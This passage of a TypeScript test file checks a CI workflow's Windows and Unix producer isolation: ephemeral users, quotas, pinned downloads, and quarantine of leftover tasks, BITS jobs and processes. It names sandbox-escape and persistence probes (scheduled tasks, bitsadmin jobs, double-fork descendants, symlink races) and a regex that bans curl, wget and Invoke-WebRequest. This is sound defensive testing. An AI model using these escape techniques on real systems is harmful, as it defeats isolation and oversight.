      '$definition.RegistrationInfo.Source = $source',
      '$definition.Principal.UserId = $UserSid',
      '$definition.Principal.LogonType = 3',
      "Join-Path $env:SystemRoot 'System32\\ping.exe'",
      "$action.Arguments = '-t 127.0.0.1'",
      '$action.WorkingDirectory =',
      '$metadataValues',
      'Principal-only task metadata contained an attributable identity.',
      'RegisteredTask = $registeredTask',
      '[switch]$Start',
      'if ($Start) {',
      '$runningTask = $registeredTask.Run($null)',
      'RunAttempted = $runAttempted',
      'RunErrorHResult = $runErrorHResult',
    ]) {
      expect(principalOnlyTask).toContain(required);
    }
    for (const forbidden of [
      '.UserName',
      '.RootPath',
      '.WorkspacePath',
      '$serviceEscapeJobName',
      '$serviceEscapeNonce',
      '$failureEscapeJobName',
      'OPENCOVEN_WINDOWS_BOOTSTRAP_ROOT',
      'GITHUB_WORKSPACE',
    ]) {
      expect(principalOnlyTask).not.toContain(forbidden);
    }
    expect(runtimeTest).toContain("-TaskNonce '$principalOnlyNonce'");
    expect(runtimeTest).not.toContain("-TaskNonce '$serviceEscapeNonce'");
    expect(runtimeTest).not.toContain("-TaskNonce '$failureEscapeNonce'");
    for (const generatedInvocation of [
      "`$principalOnlyTask = Register-PrincipalOnlyInteractiveTask -UserSid '$($serviceEscapeContext.User.Sid)' -TaskNonce '$principalOnlyNonce' -ForbiddenFragments `$forbiddenTaskFragments",
      "`$sharedChildTask = Register-PrincipalOnlyInteractiveTask -UserSid '$($serviceEscapeContext.User.Sid)' -FolderPath '$runCreatedSharedChildPath' -TaskName '$sharedChildTaskName' -ForbiddenFragments `$forbiddenTaskFragments",
      "`$preExistingFolderTask = Register-PrincipalOnlyInteractiveTask -UserSid '$($serviceEscapeContext.User.Sid)' -FolderPath '$preExistingTaskFolderPath' -TaskName '$preExistingFolderTaskName' -ForbiddenFragments `$forbiddenTaskFragments",
    ]) {
      expect(runtimeTest).toContain(generatedInvocation);
    }
    const serviceEscapeProducerStart = runtimeTest.indexOf(
      '    $serviceEscapeProducer = Join-Path',
    );
    const serviceEscapeTaskParameters = runtimeTest.indexOf(
      '`$taskParameters = @{',
      serviceEscapeProducerStart,
    );
    expect(serviceEscapeProducerStart).toBeGreaterThan(-1);
    expect(serviceEscapeTaskParameters).toBeGreaterThan(serviceEscapeProducerStart);
    expect(runtimeTest.slice(serviceEscapeProducerStart, serviceEscapeTaskParameters)).not.toMatch(
      /Register-PrincipalOnlyInteractiveTask `\r?\n/,
    );
    const terminalPersistenceSetup = runtimeTest.slice(
      runtimeTest.indexOf("      'stage-terminal-persistence.ps1'"),
      runtimeTest.indexOf(
        '    $password = [string]$passwordProperty.GetValue($Context.User)',
        runtimeTest.indexOf("      'stage-terminal-persistence.ps1'"),
      ),
    );
    expect(terminalPersistenceSetup).toContain('`$terminalTaskParameters = @{');
    expect(terminalPersistenceSetup).toContain('  Start = `$true');
    expect(terminalPersistenceSetup).toContain(
      '`$task = Register-PrincipalOnlyInteractiveTask @terminalTaskParameters',
    );
    expect(
      runtimeTest.match(
        /& \(Join-Path `\$env:SystemRoot 'System32\\bitsadmin\.exe'\) ``\r?\n {2}\/create ``/g,
      ),
    ).toHaveLength(2);
    expect(terminalPersistenceSetup).toContain(
      'Assert-PrincipalOnlySchedulerRunAttemptResult -Probe `$task',
    );
    for (const scheduledActionIsolationCall of [
      '`$lateRunIsolationParameters = @{',
      'Assert-ScheduledActionRunIsolation @lateRunIsolationParameters',
      '`$primaryRunIsolationParameters = @{',
      'Assert-ScheduledActionRunIsolation @primaryRunIsolationParameters',
      '`$nonzeroRunIsolationParameters = @{',
      'Assert-ScheduledActionRunIsolation @nonzeroRunIsolationParameters',
    ]) {
      expect(runtimeTest).toContain(scheduledActionIsolationCall);
    }
    expect(runtimeTest).not.toContain('Assert-ScheduledActionRunIsolation `\n');
    expect(runtimeTest).toContain(
      "`$taskProbe.TaskPath -cne '$taskFolderPath\\$serviceEscapeName'",
    );
    expect(runtimeTest).not.toContain('$serviceEscapeTaskPath');
    for (const schedulerStartEvidence of [
      'function Assert-ScheduledActionRunIsolation {',
      '$hasStartedMarker = [IO.File]::Exists($StartedMarker)',
      '$hasPidMarker = [IO.File]::Exists($PidMarker)',
      '$hasSidMarker = [IO.File]::Exists($SidMarker)',
      '$hasStartedMarker -or $hasPidMarker -or $hasSidMarker -or',
      "'Task Scheduler action process readiness was incomplete.'",
      '[ScheduledActionIsolationProbe]::AssertAliveOutsideJobWithPrimaryTokenSid(',
    ]) {
      expect(runtimeTest).toContain(schedulerStartEvidence);
    }
    expect(terminalPersistenceSetup).toContain(
      'Terminal failure principal-only scheduled action EnginePID',
    );
    expect(runtimeTest).toContain('Terminal failure deterministic exact-SID process');
    for (const authoritativeHandleProof of [
      '$serviceEscapeJob.AuthoritativeHandleValue',
      '$failureEscapeJob.AuthoritativeHandleValue',
      '$SupervisorJob.AuthoritativeHandleValue',
      '-SupervisorJob $Job',
      'new IntPtr(authoritativeJobHandle)',
    ]) {
      expect(runtimeTest).toContain(authoritativeHandleProof);
    }
    expect(runtimeTest).toContain('SetupPid = $setupPid');
    expect(runtimeTest).toContain('Assert-ProcessExited -ProcessId $persistence.SetupPid');
    expect(runtimeTest).not.toContain(
      'Terminal failure persistence task did not expose a live EnginePID.',
    );
    expect(runtimeTest).toContain(
      'Assert-NoExactSidPersistence -Sid $serviceEscapeContext.User.Sid',
    );
    expect(runtimeTest).toContain(
      'Assert-NoExactSidPersistence -Sid $failureEscapeContext.User.Sid',
    );
    for (const principalIdentityGuard of [
      'function Resolve-RegisteredPrincipalSid {',
      '[Security.Principal.SecurityIdentifier]::new(`$UserId).Value',
      '[Security.Principal.NTAccount]::new(`$UserId).Translate(',
      '(Resolve-RegisteredPrincipalSid -UserId (',
      '[string]`$exactSidRegistration.Probe.RegisteredTask.Definition.Principal.UserId',
    ]) {
      expect(runtimeTest).toContain(principalIdentityGuard);
    }
    expect(runtimeTest).toContain("throw 'Task was not registered for the exact isolated SID.'");
    expect(runtimeTest).not.toContain(
      "throw 'Shared-folder principal task did not expose a running instance.'",
    );
    expect(runtimeTest).not.toContain(
      "throw 'Principal-only scheduled action did not expose a live EnginePID.'",
    );
    expect(runtimeTest).toContain(
      "-Failure 'Principal-only exact-SID Task Scheduler registration survived cleanup.'",
    );
    expect(runtimeTest).toContain(
      "-Failure 'Matching task registration in a pre-existing folder survived quarantine.'",
    );
    expect(runtimeTest).toContain('$preExistingSharedFolderPath');
    expect(runtimeTest).toContain('$runCreatedSharedChildPath');
  });

  test('covers every terminal Windows producer failure with idempotent quarantine', () => {
    const runtimeTest = readFileSync(
      resolve(projectRoot, 'scripts', 'windows-job-supervisor.test.ps1'),
      'utf8',
    );

    for (const failureCase of [
      'stdout-overflow',
      'stderr-overflow',
      'directory-quota',
      'launch-exception',
    ]) {
      expect(runtimeTest).toContain(`-Label '${failureCase}'`);
    }
    for (const required of [
      'Assert-TerminalFailureQuarantine',
      'Assert-NoExactSidPersistence',
      'Get-ExactSidScheduledTaskCount',
      'Get-ExactSidBitsJobCount',
      'CountProcessesByPrimaryTokenSid',
      'Terminal failure account was not disabled.',
      'Terminal failure quarantine did not complete.',
      'Terminal failure left an exact-SID process, task, or BITS job.',
      'Terminal failure artifact capture was not rejected.',
      '$Job.QuarantineIsolatedIdentity()',
      'Second terminal quarantine invocation changed completed state.',
      'Terminal failure ephemeral local user survived cleanup.',
      'Terminal failure ephemeral Windows profile survived cleanup.',
      'Terminal failure ephemeral bootstrap root survived cleanup.',
      '$Result.StdoutOverflow',
      '$Result.StderrOverflow',
      '$Result.ResourceQuotaExceeded',
      'Terminal producer attempt failed.',
    ]) {
      expect(runtimeTest).toContain(required);
    }
  });

  test('keeps the native Windows proof probes executable and fully instrumented', () => {
    const runtimeTest = readFileSync(
      resolve(projectRoot, 'scripts', 'windows-job-supervisor.test.ps1'),
      'utf8',
    );
    const quarantineProbeStart = runtimeTest.indexOf('function Invoke-QuarantineSequenceProbe {');
    const quarantineProbeEnd = runtimeTest.indexOf('\n$orderedSteps =', quarantineProbeStart);
    const quarantineProbe = runtimeTest.slice(quarantineProbeStart, quarantineProbeEnd);
    const failureProbeStart = runtimeTest.indexOf('function Assert-QuarantineSequenceFailure {');
    const failureProbeEnd = runtimeTest.indexOf(
      '\nAssert-QuarantineSequenceFailure `',
      failureProbeStart,
    );
    const failureProbe = runtimeTest.slice(failureProbeStart, failureProbeEnd);
    const artifactFailureStart = runtimeTest.indexOf('$artifactFailureSteps =');
    const artifactFailureEnd = runtimeTest.indexOf('\n$aggregateSteps =', artifactFailureStart);
    const artifactFailure = runtimeTest.slice(artifactFailureStart, artifactFailureEnd);

    expect(quarantineProbeStart).toBeGreaterThan(-1);
    expect(quarantineProbeEnd).toBeGreaterThan(quarantineProbeStart);
    expect(quarantineProbe).toContain(
      '[Parameter(Mandatory)][AllowEmptyCollection()]' + '[Collections.Generic.List[string]]$Steps',
    );
    expect(runtimeTest).not.toContain(
      '[Parameter(Mandatory)][Collections.Generic.List[string]]$Steps',
    );

    expect(runtimeTest).toContain('function Assert-ExpectedReflectionFailure {');
    expect(runtimeTest).toContain('catch [Management.Automation.MethodInvocationException]');
    expect(runtimeTest).toContain('$underlying = $_.Exception.InnerException');
    expect(runtimeTest).toContain('$underlying -is [Reflection.TargetInvocationException]');
    expect(runtimeTest).toContain('$underlying = $underlying.InnerException');
    expect(runtimeTest).toContain('$underlying.GetType() -ne $ExpectedType');
    expect(runtimeTest).toContain('$underlying.Message -cne $ExpectedMessage');
    expect(runtimeTest).not.toContain('catch [Reflection.TargetInvocationException]');

    expect(failureProbeStart).toBeGreaterThan(-1);
    expect(failureProbeEnd).toBeGreaterThan(failureProbeStart);
    expect(failureProbe).toContain('$cleanupScheduledTasksProbe = $CleanupScheduledTasks');
    expect(failureProbe).toContain('$cleanupBitsJobsProbe = $CleanupBitsJobs');
    expect(failureProbe).toContain('$drainProcessesProbe = $DrainProcesses');
    for (const marker of ['scheduler', 'bits', 'processes']) {
      expect(failureProbe).toContain(`$steps.Add('${marker}')`);
    }
    expect(failureProbe.indexOf("$steps.Add('scheduler')")).toBeLessThan(
      failureProbe.indexOf('$cleanupScheduledTasksProbe.Invoke()'),
    );
    expect(failureProbe.indexOf("$steps.Add('bits')")).toBeLessThan(
      failureProbe.indexOf('$cleanupBitsJobsProbe.Invoke()'),
    );
    expect(failureProbe.indexOf("$steps.Add('processes')")).toBeLessThan(
      failureProbe.indexOf('$drainProcessesProbe.Invoke()'),
    );

    expect(artifactFailureStart).toBeGreaterThan(-1);
    expect(artifactFailureEnd).toBeGreaterThan(artifactFailureStart);
    expect(artifactFailure).toContain("$artifactFailureSteps.Add('seal')");
    expect(artifactFailure).toContain("$artifactFailureSteps.Add('capture')");
    expect(artifactFailure).toContain(
      "[string]::Join(',', $artifactFailureSteps) -cne 'quarantine-proof,seal'",
    );
  });

  test('creates a distinct non-admin Windows identity before supervised mutation', () => {
    const workflow = readFileSync(workflowPath, 'utf8');
    const bootstrap = workflowStep(workflow, 'Bootstrap supervised Windows conformance');
    const runBody = workflowRunBody(bootstrap);
    const identityCreate = runBody.indexOf('[OpenCoven.WindowsIsolatedUser]::Create(');
    const jobCreate = runBody.indexOf('[OpenCoven.WindowsJobSupervisor]::Create(');
    const supervisedRun = runBody.indexOf('$job.RunProducerAsUserAndQuarantine(');

    expect(identityCreate).toBeGreaterThan(-1);
    expect(jobCreate).toBeGreaterThan(identityCreate);
    expect(supervisedRun).toBeGreaterThan(jobCreate);
    expect(runBody.indexOf('Download-PinnedAsset')).toBeGreaterThan(identityCreate);
    expect(runBody.indexOf('git fetch exact protected Chat revision')).toBeGreaterThan(
      identityCreate,
    );
    expect(runBody).toContain('$workspace = $isolatedUser.WorkspacePath');
    expect(runBody).toContain('HOME = $isolatedUser.ProfilePath');
    expect(runBody).toContain('USERPROFILE = $isolatedUser.ProfilePath');
    expect(runBody).toContain('TEMP = $isolatedUser.TempPath');
    expect(runBody).toContain('TMP = $isolatedUser.TempPath');
    expect(runBody).toContain('GITHUB_WORKSPACE = $workspace');
    expect(runBody).toContain("XDG_CACHE_HOME = (Join-Path $bootstrapRoot 'xdg\\cache')");
    expect(runBody).toContain('DOTNET_CLI_HOME = $isolatedUser.ProfilePath');
    expect(runBody).toContain("NUGET_PACKAGES = (Join-Path $bootstrapRoot 'nuget')");
    expect(runBody).toContain("NPM_CONFIG_CACHE = (Join-Path $bootstrapRoot 'npm-cache')");
    expect(runBody).toContain('ProtectSupervisorDirectory');
    expect(runBody).toContain('$artifactWorkspace');
    expect(runBody).toContain('$job.CaptureIsolatedArtifact(');
    expect(runBody).toContain('RequireCanonicalSchemaV2Artifact');
    expect(runBody).toContain('$job.PublishValidatedArtifact(');
    expect(runBody).toContain('OPENCOVEN_EXPECTED_RECORD_SHA256');
    expect(runBody).toContain('[Console]::OpenStandardInput()');
    expect(runBody).toContain('Fresh trusted handle-captured record validation failed.');
    expect(runBody).not.toContain('[IO.File]::Copy(');
    expect(runBody).toContain('OPENCOVEN_WINDOWS_SUPERVISOR_PID');
    expect(runBody).toContain('OPENCOVEN_WINDOWS_SUPERVISOR_JOB_HANDLE');
    expect(runBody).toContain('RequireRestrictedSupervisorBoundary');
    expect(runBody).toContain('$isolatedUser.Dispose()');
    expect(runBody).not.toContain('$job.Run(');

    const resultCheck = runBody.indexOf('Supervised Windows production failed with exit code');
    const capture = runBody.indexOf('$job.CaptureIsolatedArtifact(', resultCheck);
    const freshValidation = runBody.indexOf(
      '[OpenCoven.WindowsJobSupervisor]::RequireCanonicalSchemaV2Artifact(',
      capture,
    );
    const publish = runBody.indexOf('$job.PublishValidatedArtifact(', freshValidation);
    expect(resultCheck).toBeGreaterThan(-1);
    expect(capture).toBeGreaterThan(resultCheck);
    expect(freshValidation).toBeGreaterThan(capture);
    expect(publish).toBeGreaterThan(freshValidation);
    expect(runBody.slice(capture, publish)).not.toContain('$job.RunAsUserWithStandardInput(');
    expect(runBody.slice(capture, publish)).not.toMatch(
      /\[IO\.File\]::ReadAll(?:Bytes|Text)\(\s*\$isolatedRecord/u,
    );
  });

  test('documents the exact committed workflow and native supervisor metadata', () => {
    const guide = readFileSync(resolve(projectRoot, 'docs', 'phase1-conformance.md'), 'utf8');
    const metadataPaths = [
      '.github/workflows/client-v1-conformance.yml',
      ...staticLocalMjsModuleGraph('scripts/phase1-conformance.mjs'),
      'scripts/phase1-linux-secret-service.sh',
      'scripts/unix-artifact-handoff.c',
      'scripts/unix-producer-command.sh',
      'scripts/unix-producer-supervisor.sh',
      'scripts/unix-producer-supervisor-attack.c',
      'scripts/unix-producer-supervisor.test.sh',
      'scripts/phase1-windows-supervisor-build.sh',
      'scripts/phase1-windows-supervisor-install.ps1',
      'scripts/windows-job-supervisor.cs',
      'scripts/windows-job-supervisor.test.ps1',
    ];
    for (const relativePath of [...new Set(metadataPaths)]) {
      const bytes = readFileSync(resolve(projectRoot, relativePath));
      expect(guide).toContain(
        `| \`${relativePath}\` | ${bytes.byteLength.toLocaleString('en-US')} | \`${sha256(bytes)}\` |`,
      );
    }
  });

  test('runs all Unix production under a distinct ephemeral UID before descriptor handoff', () => {
    const workflow = readFileSync(workflowPath, 'utf8');
    const producer = workflowJob(workflow, 'platform-conformance');
    const unixStep = workflowStep(workflow, 'Run supervised Unix production and handoff');
    const trustedSetup = workflowStep(workflow, 'Prepare trusted Unix supervisor');
    const validation = workflowStep(workflow, 'Validate broker-owned Unix platform record');
    const supervisor = readFileSync(
      resolve(projectRoot, 'scripts', 'unix-producer-supervisor.sh'),
      'utf8',
    );
    const command = readFileSync(
      resolve(projectRoot, 'scripts', 'unix-producer-command.sh'),
      'utf8',
    );
    const handoff = readFileSync(
      resolve(projectRoot, 'scripts', 'unix-artifact-handoff.c'),
      'utf8',
    );
    const producerHarness = readFileSync(
      resolve(projectRoot, 'scripts', 'phase1-schema-v2-producer.mjs'),
      'utf8',
    );

    expect(unixStep).toContain("if: matrix.platform != 'win32-x64'");
    expect(unixStep).toContain('sudo --non-interactive');
    expect(unixStep).toContain('scripts/unix-producer-supervisor.sh');
    expect(unixStep).toContain('--command scripts/unix-producer-command.sh');
    expect(unixStep).toContain(
      '--handoff-helper "$RUNNER_TEMP/opencoven-unix-broker/unix-artifact-handoff"',
    );
    expect(unixStep).toContain('--validator-revision "$OPENCOVEN_VALIDATOR_REVISION"');
    expect(trustedSetup).toContain('cc -std=c11');
    expect(trustedSetup).toContain('unix-artifact-handoff.c');
    expect(trustedSetup).toContain('createHash');
    for (const relativePath of [
      'scripts/phase1-conformance.mjs',
      'scripts/phase1-schema-v2-producer.mjs',
      'scripts/phase1-linux-secret-service.sh',
      'scripts/unix-artifact-handoff.c',
      'scripts/unix-producer-command.sh',
      'scripts/unix-producer-supervisor.sh',
    ]) {
      const bytes = readFileSync(resolve(projectRoot, relativePath));
      expect(trustedSetup).toContain(`[${bytes.byteLength}, '${sha256(bytes)}']`);
    }
    expect(validation).toContain('phase1-artifact-secret-scan.mjs');
    expect(validation).toContain('scanPhase1ArtifactText');
    expect(validation).toContain('schemaVersion !== 2');
    expect(supervisor).toContain("tool_path='/usr/bin:/bin:/usr/sbin:/sbin'");
    expect(supervisor).not.toContain('/usr/local/bin:/usr/bin');
    expect(supervisor).toContain('/usr/bin/dsmemberutil checkmembership');
    expect(supervisor).not.toContain('/usr/sbin/dsmemberutil');

    for (const forbiddenStep of [
      'Install frozen dependencies',
      'Set up frozen Rust',
      'Produce platform evidence',
      'Validate canonical platform record',
    ]) {
      expect(producer).not.toContain(`      - name: ${forbiddenStep}\n`);
    }
    for (const required of [
      'pnpm install --frozen-lockfile --ignore-scripts',
      'rustup toolchain install 1.95.0 --profile minimal',
      'phase1-linux-secret-service.sh',
      'phase1-conformance.mjs',
      'OPENCOVEN_UNIX_PRODUCER_REQUIRED',
    ]) {
      expect(command).toContain(required);
      expect(producer).not.toContain(`run: ${required}`);
    }
    for (const required of [
      'useradd',
      'userdel',
      'setpriv',
      'cgroup.kill',
      'cgroup.events',
      'populated 0',
      'dscl',
      'dseditgroup',
      'AuthenticationAuthority',
      'ps -axo uid=,pid=',
      'kill -KILL',
      'unix-artifact-handoff',
      'chown -R -h root:0 "$workspace"',
      'chmod -R a-w "$workspace"',
      '"$workspace/node_modules"',
    ]) {
      expect(supervisor).toContain(required);
    }
    expect(producerHarness).toContain('`safe.directory=$' + '{localSource}`');
    for (const required of [
      'openat',
      'O_NOFOLLOW',
      'O_DIRECTORY',
      'O_EXCL',
      'S_ISREG',
      'st_nlink != 1',
      'fchown',
      'fchmod',
      'fsync',
      'source identity changed during handoff',
    ]) {
      expect(handoff).toContain(required);
    }
  });

  test('runs native Linux and macOS escape and artifact-race tests in CI', () => {
    const workflow = readFileSync(resolve(projectRoot, '.github', 'workflows', 'ci.yml'), 'utf8');
    const job = workflowJob(workflow, 'unix-supervisor');
    expect(job).toContain('runs-on: $' + '{{ matrix.runner }}');
    expect(job).toContain('runner: ubuntu-24.04');
    expect(job).toContain('runner: macos-14');
    expect(job).toContain('bash scripts/unix-producer-supervisor.test.sh');

    const runtimeTest = readFileSync(
      resolve(projectRoot, 'scripts', 'unix-producer-supervisor.test.sh'),
      'utf8',
    );
    for (const requiredCase of [
      'setsid/double-fork descendant survived containment cleanup',
      'escaped descendant replaced the handed-off record',
      'symlink artifact handoff unexpectedly succeeded',
      'hardlink artifact handoff unexpectedly succeeded',
      'parent replacement artifact handoff unexpectedly succeeded',
      'in-place rewrite artifact handoff unexpectedly succeeded',
      'ephemeral producer UID was reused or not deleted',
      'producer and broker UIDs were not distinct',
    ]) {
      expect(runtimeTest).toContain(requiredCase);
    }
  });

  test('pins and verifies the complete supervised Windows bootstrap and evidence tree', () => {
    const workflow = readFileSync(workflowPath, 'utf8');
    const bootstrap = workflowStep(workflow, 'Bootstrap supervised Windows conformance');
    const environment = workflowStepEnvironment(bootstrap);
    const runBody = workflowRunBody(bootstrap);

    for (const required of [
      'windows-2025',
      'AMD64',
      'C:\\Program Files\\PowerShell\\7\\pwsh.exe',
      'C:\\Windows\\System32\\kernel32.dll',
      'C:\\Windows\\System32\\advapi32.dll',
      'C:\\Windows\\System32\\netapi32.dll',
      'C:\\Windows\\System32\\userenv.dll',
      'node-v24.18.1-win-x64.zip',
      'pnpm-10.34.0.tgz',
      'rustup-init.exe',
      '1.95.0',
      'PortableGit',
      'Get-FileHash',
      'SHA256',
      'https://',
      'git fetch',
      'pnpm install --frozen-lockfile --ignore-scripts',
      'phase1-conformance.mjs',
      'Validate canonical platform record',
      'OPENCOVEN_WINDOWS_JOB_REQUIRED',
      'OPENCOVEN_WINDOWS_JOB_NONCE',
      'OPENCOVEN_WINDOWS_JOB_NAME',
      'OPENCOVEN_WINDOWS_WORKSPACE',
      'OPENCOVEN_WINDOWS_ARTIFACT_DIRECTORY',
      'OPENCOVEN_WINDOWS_SOURCE_RECORD',
      'Get-AuthenticodeSignature',
      'ResourceQuotaExceeded',
      'phase1-conformance-run-*\\checkouts\\sdk',
      'phase1-conformance-run-*\\checkouts\\chat',
      'phase1-conformance-run-*\\checkouts\\cave',
      'phase1-conformance-run-*\\checkouts\\coven',
      'phase1-conformance-run-*\\checkouts\\validator',
      'phase1-conformance-run-*\\checkouts\\producer',
      'phase1-conformance-run-*\\cargo-home\\registry',
      'phase1-conformance-run-*\\cargo-home\\git',
      'phase1-conformance-run-*\\pnpm-store',
      'phase1-conformance-run-*\\build',
    ]) {
      expect(bootstrap).toContain(required);
    }
    for (const [name, value] of Object.entries(reviewedWindowsPins)) {
      expect(environment).toContain(`${name}: '${value}'`);
      expect(runBody).toContain(`$env:${name}`);
    }
    expect(runBody).not.toMatch(/Sort-Object[\s\S]*Select-Object -First 1/u);
    expect(runBody).not.toMatch(/-notin @\('7\./u);
    expect(runBody).not.toMatch(/StartsWith\(\s*'10\.0\.26100\.'/u);
    expect(runBody).toContain('AllowAutoRedirect = $false');
    expect(runBody).toContain('-AllowedRedirectHosts');
    expect(runBody).toContain('-MaximumRedirects');
    expect(runBody).toContain("'github.com', 'release-assets.githubusercontent.com'");
    expect(runBody).not.toContain("'objects.githubusercontent.com'");
    expect(runBody).toContain('--config.store-dir=$($env:PNPM_STORE_DIR)');
    expect(runBody).toContain('CARGO_NET_GIT_FETCH_WITH_CLI');
    expect(runBody).toContain('$recordPath = $env:OPENCOVEN_WINDOWS_SOURCE_RECORD');
    expect(runBody).toContain(
      "OPENCOVEN_WINDOWS_ARTIFACT_DIRECTORY = (Join-Path $workspace '.artifacts')",
    );
    expect(runBody).toContain(
      "OPENCOVEN_WINDOWS_SOURCE_RECORD = (Join-Path $workspace '.artifacts\\client-v1-conformance-win32-x64.json')",
    );
    expect(bootstrap).not.toMatch(/\b(?:curl|wget|Invoke-WebRequest)\b/u);
    expect(bootstrap).not.toContain('http://');
    expect(bootstrap).toMatch(/[0-9a-f]{64}/u);
  });

  test('requires the exact reviewed Windows image, Visual Studio, and v143 tool paths', () => {
    const workflow = readFileSync(workflowPath, 'utf8');
    const bootstrap = workflowStep(workflow, 'Bootstrap supervised Windows conformance');
    const environment = workflowStepEnvironment(bootstrap);
    const runBody = workflowRunBody(bootstrap);

    for (const rejectedMsvcPathVersion of ['14.50.35717', '14.44.35211']) {
      expect(workflow).not.toContain(`VC\\Tools\\MSVC\\${rejectedMsvcPathVersion}`);
    }
    for (const [name, value] of Object.entries(reviewedWindowsPins)) {
      expect(environment).toContain(`${name}: '${value}'`);
      expect(runBody).toContain(`$env:${name}`);
    }
    expect(runBody).toContain(
      '[Diagnostics.FileVersionInfo]::GetVersionInfo($trustedVisualStudio).ProductVersion',
    );
    expect(runBody).toContain("(Join-Path $msvcBin 'cl.exe')");
    expect(runBody).toContain("(Join-Path $msvcBin 'link.exe')");
  });

  test('guards each Windows network and bootstrap phase with reviewed quotas', () => {
    const bootstrap = workflowRunBody(
      workflowStep(readFileSync(workflowPath, 'utf8'), 'Bootstrap supervised Windows conformance'),
    );
    const requiredQuotaRoots = [
      "Join-Path $bootstrapRoot 'downloads'",
      "Join-Path $bootstrapRoot 'tools\\git'",
      "Join-Path $bootstrapRoot 'tools\\node'",
      "Join-Path $bootstrapRoot 'tools\\pnpm'",
      "Join-Path $bootstrapRoot 'rustup'",
      "Join-Path $bootstrapRoot 'cargo\\registry'",
      "Join-Path $bootstrapRoot 'cargo\\git'",
      "Join-Path $bootstrapRoot 'pnpm-store'",
      "Join-Path $workspace '.git\\objects'",
      "Join-Path $bootstrapRoot 'phase1-conformance-run-*\\checkouts\\sdk'",
      "Join-Path $bootstrapRoot 'phase1-conformance-run-*\\checkouts\\chat'",
      "Join-Path $bootstrapRoot 'phase1-conformance-run-*\\checkouts\\cave'",
      "Join-Path $bootstrapRoot 'phase1-conformance-run-*\\checkouts\\coven'",
      "Join-Path $bootstrapRoot 'phase1-conformance-run-*\\checkouts\\validator'",
      "Join-Path $bootstrapRoot 'phase1-conformance-run-*\\checkouts\\producer'",
      "Join-Path $bootstrapRoot 'phase1-conformance-run-*\\build'",
    ];
    for (const quotaRoot of requiredQuotaRoots) {
      expect(bootstrap).toContain(quotaRoot);
    }
    for (const [label, limit] of [
      ['bootstrap aggregate', '12GB'],
      ['workspace aggregate', '2GB'],
      ['direct downloads', '128MB'],
      ['protected Chat Git objects', '512MB'],
      ['SDK checkout', '768MB'],
      ['Chat checkout', '768MB'],
      ['Cave checkout', '768MB'],
      ['Coven checkout', '768MB'],
      ['validator checkout', '768MB'],
      ['producer checkout', '768MB'],
      ['rustup toolchains', '1GB'],
      ['bootstrap Cargo registry', '2GB'],
      ['bootstrap Cargo git', '1GB'],
      ['bootstrap pnpm store', '3GB'],
      ['harness Cargo registry', '2GB'],
      ['harness Cargo git', '1GB'],
      ['harness pnpm store', '3GB'],
      ['harness build roots', '4GB'],
      ['harness execution aggregate', '10GB'],
    ] as const) {
      expect(bootstrap).toMatch(
        new RegExp(`'${label}'[\\s\\S]{0,180}\\n\\s+${limit.replace('.', '\\.')}`, 'u'),
      );
    }
    expect(bootstrap).toContain('$job.RunProducerAsUserAndQuarantine(');
    expect(bootstrap).toContain('$directoryQuotas');
    expect(bootstrap).toContain('Supervised Windows production exceeded a resource quota.');
  });
});
